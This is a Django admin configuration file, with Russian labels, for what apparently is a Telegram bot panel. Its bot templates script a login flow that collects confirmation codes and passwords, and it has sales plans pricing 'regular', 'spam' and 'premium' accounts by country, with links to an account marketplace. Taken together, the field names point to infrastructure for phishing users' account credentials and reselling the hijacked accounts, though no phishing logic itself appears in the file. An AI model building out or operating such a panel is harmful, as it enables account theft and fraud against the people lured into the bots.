from django.contrib import admin
from .models import BotTemplate, BotInstance, BotLog, MailingCampaign, MailingLog, SalesPlan, CountryPrice


@admin.register(SalesPlan)
class SalesPlanAdmin(admin.ModelAdmin):
    list_display = ['name', 'owner', 'product_name', 'is_active', 'created_at']
    list_filter = ['is_active', 'created_at']
    search_fields = ['name', 'product_name']
    readonly_fields = ['created_at']

    fieldsets = (
        ('Основные настройки', {
            'fields': ('name', 'owner', 'product_name', 'product_description', 'buyer_info')
        }),
        ('Статус', {
            'fields': ('is_active',)
        }),
    )


@admin.register(CountryPrice)
class CountryPriceAdmin(admin.ModelAdmin):
    list_display = ['sales_plan', 'country', 'account_type', 'price_regular', 'price_spam', 'price_premium',
                    'not_for_sale_regular']
    list_filter = ['country', 'account_type', 'not_for_sale_regular', 'not_for_sale_spam', 'not_for_sale_premium']
    search_fields = ['sales_plan__name', 'country']
    list_select_related = ['sales_plan']

    fieldsets = (
        ('Основная информация', {
            'fields': ('sales_plan', 'country', 'account_type')
        }),
        ('Цены по типам аккаунтов', {
            'fields': (
                ('price_regular', 'not_for_sale_regular'),
                ('price_spam', 'not_for_sale_spam'),
                ('price_premium', 'not_for_sale_premium'),
            )
        }),
    )


@admin.register(BotTemplate)
class BotTemplateAdmin(admin.ModelAdmin):
    list_display = ['name', 'owner', 'is_active', 'created_at']
    list_filter = ['is_active', 'created_at']
    search_fields = ['name']
    readonly_fields = ['created_at', 'updated_at']

    fieldsets = (
        ('Основные настройки', {
            'fields': ('name', 'owner', 'is_active')
        }),
        ('Приветственное сообщение', {
            'fields': ('welcome_photo', 'welcome_message', 'login_button_text')
        }),
        ('Отправка кода', {
            'fields': ('sending_code_message',)
        }),
        ('Код отправлен', {
            'fields': ('code_sent_message', 'view_code_button_text', 'view_code_button_url')
        }),
        ('Проверка кода', {
            'fields': ('checking_code_message', 'code_invalid_message')
        }),
        ('Пароль', {
            'fields': ('password_request_message', 'checking_password_message', 'password_invalid_message')
        }),
        ('Успех', {
            'fields': ('success_photo', 'success_message')
        }),
        ('Ошибки', {
            'fields': ('error_message', 'timeout_message', 'timeout_button_text')
        }),
        ('Неизвестная команда', {
            'fields': ('unknown_command_message',)
        }),
        ('Поддержка', {
            'fields': (
            'support_text', 'support_chat_url', 'panel_chat_text', 'panel_chat_url', 'lolzteam_text', 'lolzteam_url')
        }),
        ('Подписка и спонсор', {
            'fields': ('requires_subscription', 'subscription_channel', 'sponsor_url', 'sponsor_text')
        }),
    )


@admin.register(BotInstance)
class BotInstanceAdmin(admin.ModelAdmin):
    list_display = ['name', 'owner', 'template', 'sales_plan', 'auth_method', 'is_active', 'is_running', 'created_at']
    list_filter = ['auth_method', 'bot_type', 'is_active', 'is_running', 'created_at']
    search_fields = ['name', 'token']
    readonly_fields = ['created_at', 'last_started']

    fieldsets = (
        ('Основные настройки', {
            'fields': ('name', 'owner', 'template', 'sales_plan', 'token', 'bot_type')
        }),
        ('Web App настройки', {
            'fields': ('webapp_url', 'webapp_button_text')
        }),
        ('Дополнительные настройки', {
            'fields': ('channel', 'key')
        }),
        ('Функции бота', {
            'fields': (
            'inline_keyboard', 'anti_steal', 'send_code_without_number', 'auto_delete_messages', 'message_timeout')
        }),
        ('Авторизация', {
            'fields': ('auth_method',)
        }),
        ('Безопасность', {
            'fields': ('max_login_attempts', 'session_timeout', 'ip_whitelist')
        }),
        ('Уведомления', {
            'fields': ('notify_on_success', 'notify_on_error', 'admin_chat_id')
        }),
        ('Производительность', {
            'fields': ('max_concurrent_sessions', 'request_delay')
        }),
        ('Монетизация', {
            'fields': ('enable_donations', 'donation_url', 'enable_ads', 'ads_interval')
        }),
        ('Дополнительные функции', {
            'fields': ('enable_analytics', 'enable_backups', 'backup_interval')
        }),
        ('Мета-данные', {
            'fields': ('description', 'tags')
        }),
        ('Статус', {
            'fields': ('is_active', 'is_running', 'last_started', 'error_message')
        }),
    )


@admin.register(BotLog)
class BotLogAdmin(admin.ModelAdmin):
    list_display = ['bot_instance', 'level', 'action', 'username', 'timestamp']
    list_filter = ['level', 'timestamp', 'bot_instance']
    search_fields = ['action', 'details', 'username']
    readonly_fields = ['timestamp']

    fieldsets = (
        ('Основная информация', {
            'fields': ('bot_instance', 'level', 'action')
        }),
        ('Детали', {
            'fields': ('details', 'user_id', 'username')
        }),
    )


@admin.register(MailingCampaign)
class MailingCampaignAdmin(admin.ModelAdmin):
    list_display = ['name', 'owner', 'status', 'send_to_all', 'created_at', 'sent_at']
    list_filter = ['status', 'send_to_all', 'created_at']
    search_fields = ['name']
    readonly_fields = ['created_at', 'sent_at', 'total_recipients', 'successful_sends', 'failed_sends']
    filter_horizontal = ['bots']

    fieldsets = (
        ('Основные настройки', {
            'fields': ('name', 'owner', 'message_text', 'status')
        }),
        ('Получатели', {
            'fields': ('send_to_all', 'bots')
        }),
        ('Расписание', {
            'fields': ('scheduled_for',)
        }),
        ('Статистика', {
            'fields': ('total_recipients', 'successful_sends', 'failed_sends', 'sent_at')
        }),
    )


@admin.register(MailingLog)
class MailingLogAdmin(admin.ModelAdmin):
    list_display = ['mailing_campaign', 'bot_instance', 'status', 'timestamp']
    list_filter = ['status', 'timestamp']
    search_fields = ['details']
    readonly_fields = ['timestamp']

    fieldsets = (
        ('Основная информация', {
            'fields': ('mailing_campaign', 'bot_instance', 'status')
        }),
        ('Детали', {
            'fields': ('details',)
        }),
    )